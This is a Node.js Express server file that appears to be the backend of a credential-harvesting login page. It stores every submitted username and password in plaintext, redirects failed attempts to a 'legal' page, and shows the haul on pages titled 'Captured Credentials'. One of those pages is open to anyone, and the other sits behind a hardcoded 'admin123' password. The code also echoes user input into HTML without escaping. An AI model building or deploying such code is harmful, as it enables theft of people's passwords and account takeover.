const express = require('express');
const bcrypt = require('bcrypt');
const sqlite3 = require('sqlite3').verbose();
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const PORT = 3000;

console.log("✅ server.js loaded");

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

// Database
const db = new sqlite3.Database('./users.db', (err) => {
  if (err) {
    console.error("❌ Failed to connect to DB:", err.message);
  } else {
    console.log("🗃️ Connected to SQLite database.");
  }
});

// Create users table
db.run(`CREATE TABLE IF NOT EXISTS users (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  username TEXT UNIQUE,
  password TEXT
)`);

// Create login_logs table to log all entries from index.html
db.run(`CREATE TABLE IF NOT EXISTS login_logs (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  username TEXT,
  password TEXT,
  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
)`);

// Serve login page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Handle login + log attempt
app.post('/login', (req, res) => {
  const { username, password } = req.body;

  // Log every login attempt (even wrong ones)
  db.run(`INSERT INTO login_logs (username, password) VALUES (?, ?)`, [username, password], (err) => {
    if (err) console.error("❌ Failed to log login attempt:", err.message);
  });

  // Check credentials
  db.get(`SELECT * FROM users WHERE username = ?`, [username], async (err, row) => {
    if (err) {
      console.error("DB Error:", err.message);
      return res.redirect('/legal.html');
    }

    if (!row) return res.redirect('/legal.html');

    const match = await bcrypt.compare(password, row.password);
    if (match) {
      res.send(`<h1>✅ Login Successful</h1><p>Welcome, ${username}!</p>`);
    } else {
      res.redirect('/legal.html');
    }
  });
});

// Create a test user: /create-test-user
app.get('/create-test-user', async (req, res) => {
  const hashedPassword = await bcrypt.hash('123456', 10);
  db.run(`INSERT INTO users (username, password) VALUES (?, ?)`, ['testuser', hashedPassword], (err) => {
    if (err) return res.send('User already exists.');
    res.send('✅ Test user created. Username: testuser, Password: 123456');
  });
});

// View captured login attempts: /view-logins
app.get('/view-logins', (req, res) => {
  db.all('SELECT * FROM login_logs ORDER BY timestamp DESC', [], (err, rows) => {
    if (err) return res.send('Error loading login logs.');

    let html = '<h2>Captured Login Attempts</h2><ul>';
    rows.forEach(row => {
      html += `<li><strong>${row.username}</strong> | ${row.password} | ${row.timestamp}</li>`;
    });
    html += '</ul>';
    res.send(html);
  });
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running at http://localhost:${PORT}`);
});
// Simple password protection middleware
const adminPassword = 'admin123'; // You can change this

app.get('/admin', (req, res) => {
  const password = req.query.pass;

  if (password !== adminPassword) {
    return res.send(`
      <h2>🔒 Admin Access Required</h2>
      <form method="GET" action="/admin">
        <input type="password" name="pass" placeholder="Enter admin password" required />
        <button type="submit">Enter</button>
      </form>
    `);
  }

  db.all('SELECT * FROM login_logs ORDER BY id DESC', (err, rows) => {
    if (err) {
      console.error(err);
      res.status(500).send('Error fetching data');
    } else {
      let html = `
        <h2>📋 Captured Credentials</h2>
        <table border="1" cellpadding="8" cellspacing="0">
          <tr><th>ID</th><th>Username</th><th>Password</th><th>Time</th></tr>
      `;
      rows.forEach(row => {
        html += `<tr><td>${row.id}</td><td>${row.username}</td><td>${row.password}</td><td>${row.time}</td></tr>`;
      });
      html += '</table>';
      res.send(html);
    }
  });
});
